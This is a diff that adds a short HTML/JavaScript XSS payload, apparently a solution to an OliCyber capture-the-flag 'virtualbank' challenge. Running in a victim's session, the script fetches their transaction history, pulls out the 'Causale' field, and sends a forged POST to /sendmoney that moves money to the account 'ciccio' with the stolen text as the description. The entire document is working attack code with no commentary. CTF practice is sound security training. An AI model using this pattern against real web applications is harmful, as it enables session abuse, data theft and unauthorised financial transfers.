@@ -1,0 +1,19 @@
+<script>
+fetch("http://virtualbank.challs.olicyber.it/history/1")
+.then(r => r.text())
+.then(html => {
+    const doc = new DOMParser().parseFromString(html, "text/html");
+    const rows = [...doc.querySelectorAll("table.table tr")];
+    const causale = rows.find(r => r.cells[0]?.textContent.trim() === "Causale").cells[1].textContent.trim();
+
+    fetch("http://virtualbank.challs.olicyber.it/sendmoney", {
+        method: "POST",
+        headers: { "Content-Type": "application/x-www-form-urlencoded" },
+        body: new URLSearchParams({
+            to: "ciccio",
+            amount: "5",
+            description: causale
+        })
+    });
+});
+</script>
